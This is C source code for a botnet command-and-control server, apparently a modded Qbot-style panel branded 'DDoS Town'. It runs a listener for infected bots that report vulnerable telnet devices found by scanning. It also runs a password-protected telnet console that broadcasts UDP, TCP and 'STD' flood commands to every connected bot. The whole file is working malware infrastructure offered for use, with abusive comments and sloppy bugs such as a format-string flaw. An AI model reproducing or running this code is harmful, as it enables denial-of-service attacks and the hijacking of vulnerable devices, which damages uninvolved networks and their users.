/*
DoPe Servers Custom Server Sides
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
 
////////////////////////////////////
#define Control_Password "DoPe"
#define Control_Title "%c]0;Bots Loaded: %d |-| DDoS Town |-| Users Online: %d%c"
#define MAXFDS 1000000
////////////////////////////////////


struct account {
    char id[20]; 
    char password[20];
};
static struct account accounts[10];

struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];

struct telnetdata_t {
        int connected;
} managements[MAXFDS];



////////////////////////////////////


static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;


////////////////////////////////////


int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}


static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}


static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[33m ", 7, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, "\x1b[32m Said\x1b[31m: \x1b[36m", 23, MSG_NOSIGNAL);  //So we know who's talking shit m8
                }
                printf("FD: %d\n", i);
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[36m/> \x1b[0m", 14, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
 
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
 
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
 
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
 
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
 
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {
                                                printf("DUP Client - Terminating\n");
                                                if(send(infd, "!* LOLNOGTFO\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                if(send(infd, "DUP\n", 4, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                close(infd);
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) // basic IRC-like ping/pong challenge/response to see if server is alive
                                                {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                        continue;
                                                }
                                                if(strstr(buf, "REPORT ") == buf) // received a report of a vulnerable system from a scan
                                                {
                                                        char *line = strstr(buf, "REPORT ") + 7; 
                                                        fprintf(telFD, "%s\n", line); // let's write it out to disk without checking what it is!
                                                        fflush(telFD);
                                                        TELFound++;
                                                        continue;
                                                }
                                                if(strstr(buf, "SCANNER STARTED!") == buf)
                                                {
                                                        char *line = strstr(buf, "SCANNER STARTED!");
                                                        scannerreport = 1;
                                                        continue;
                                                }
                                                if(strstr(buf, "SCANNER STOPPED!") == buf)
                                                {
                                                        char *line = strstr(buf, "SCANNER STOPPED!");
                                                        scannerreport--;
                                                        continue;
                                                }
                                                if(strcmp(buf, "PONG") == 0)
                                                {
                                                        continue;
                                                }
 
                                                printf("buf: \"%s\"\n", buf);
                                        }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
 
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, Control_Title, '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 
                sleep(2);
        }
}
 
void *telnetWorker(void *sock)
{
	    char usernamez[80];
        int thefd = (int)sock;
		int nickisg0d;
		int find_line;
        managesConnected++;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char* username;
        char* password;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);
        
        if(send(thefd, "\x1b[31mUsername: \x1b[37m ", 22, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
		sprintf(usernamez, buf);
        nickstring = ("%s", buf);
						
        if(send(thefd, "\x1b[36mPassword:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
		if(strcmp(buf, Control_Password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
		
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[37m*************************************\r\n", 45, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[37m*          INVALID PASSWORD         *\r\n", 45, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[37m*        FUCK OFF RETARD, LOGGED    *\r\n", 45, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[37m*************************************\r\n", 45, MSG_NOSIGNAL) == -1) goto end;
		sleep(5);
        goto end;
        fak:
		
        pthread_create(&title, NULL, &titleWriter, sock);
        char line1[80];
		char line2[80];
		char line3[80];
		char line4[80];

		sprintf(line1, "\x1b[37m              LOADING...                        \r\n");
		sprintf(line2, "\x1b[32m              ██████████████\x1b[37m100%        \r\n"); 

		sprintf(line3, "\x1b[37m              LOADING...                        \r\n");
		sprintf(line4, "\x1b[32m              ██████████████\x1b[37m100%        \r\n");
		
		if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
	    if(send(thefd, "\r\n\x1b[31m/> \x1b[0m", 15, MSG_NOSIGNAL) == -1) goto end;
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
	    if(strstr(buf, "!* HELP")) 
	    {  
		  sprintf(botnet, "\x1b[32m!* BOTS \x1b[31m- \x1b[36m Shows bot/user count\x1b[37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	    if(strstr(buf, "!* HELP")) 
	    {  
		  sprintf(botnet, "\x1b[32m!* STATUS \x1b[31m- \x1b[36m Shows telnet status/devices\x1b[37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* HELP")) 
	    {  
		  sprintf(botnet, "\x1b[32m!* COMM \x1b[31m- \x1b[36m Shows the attack commands\x1b[37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* HELP")) 
	    {  
		  sprintf(botnet, "\x1b[32m!* CLEAR \x1b[31m- \x1b[36m Clears your screen\x1b[37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* HELP")) 
	    {  
		  sprintf(botnet, "\x1b[32m!* CREDITS \x1b[31m- \x1b[36m Shows who this was modded by\x1b[37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* STATUS")) 
        {
          sprintf(botnet, "\x1b[32mTelnet devices\x1b[31m:\x1b[36m %d \x1b[31m| \x1b[32mTelnet status\x1b[31m:\x1b[36m %d\x1b[37m\r\n", TELFound, scannerreport);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	    }  
	    if(strstr(buf, "!* COMM")) 
	    {  
		  sprintf(botnet, "\x1b[32m!* STD IP PORT TIME \x1b[31m- \x1b[36m UDP Based STD\x1b[37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } 
		if(strstr(buf, "!* COMM")) 
	    {  
		  sprintf(botnet, "\x1b[32m!* UDP IP PORT TIME 32 0 10\x1b[31m- \x1b[36m Basic UDP\x1b[37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } 
		if(strstr(buf, "!* COMM")) 
	    {  
		  sprintf(botnet, "\x1b[32m!* TCP IP PORT TIME 32 ack 1024 10\x1b[31m- \x1b[36m Basic TCP\x1b[37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } 
		if(strstr(buf, "!* BOTS")) 
	    {  
		  sprintf(botnet, "\x1b[32mBots Loaded\x1b[31m:\x1b[36m %d\x1b[37m\r\n", clientsConnected());
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } 
	    if(strstr(buf, "!* CREDITS")) 
	    {  
		  sprintf(botnet, "\x1b[32mModded \x1b[31mBy \x1b[36mDoPe Servers\x1b[37m!\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } 
	    if(strstr(buf, "CLEAR")) 
	    {  
	     if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		 if(send(thefd, line3, strlen(line3), MSG_NOSIGNAL) == -1) goto end;
		 if(send(thefd, line4, strlen(line4), MSG_NOSIGNAL) == -1) goto end;
		 pthread_create(&title, NULL, &titleWriter, sock);
         managements[thefd].connected = 1;
        } 
		
                trim(buf);
                if(send(thefd, "\x1b[33m/> \x1b[0m", 12, MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].id, buf);
                FILE *logFile;
                logFile = fopen("chat.log", "a"); //Mark this out if you dont want to keep logs...
                fprintf(logFile, "%s: \"%s\"\n",accounts[find_line].id, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
 
void *telnetListener(void *useless)
{
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(69);//This is the Control_Port so redefine it if you would like to, #define Control_Port 69
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
 
        int s, threads;
        struct epoll_event event;
		
		printf("\x1b[37mScreen Started Net up\x1b[32m,\x1b[37m Connect Port\x1b[32m:\x1b[31m 15\x1b[37m\n");//change the 15 to whatever your port is, mine is 15, change this at line 480
        telFD = fopen("screen.log", "a+");
        threads = atoi(argv[2]);
		
        listenFD = create_and_bind (argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort ();
 
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort ();
 
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
 
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
 
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
 
        pthread_t thread[threads + 1];//this needs to be +1 if it was +2 it would send it to half the bots only morons someone had this as +2 bc they dont know shit and they dont want anyone having power
        while(threads--)
        {
                pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
 
        pthread_create(&thread[0], NULL, &telnetListener, (void *)NULL);
 
        while(1)
        {
                broadcast("PING", -1, "SNICKERS"); // ping bots every 60 sec on the main thread 
                sleep(60);
        }
  
        close (listenFD);
 
        return EXIT_SUCCESS;
}
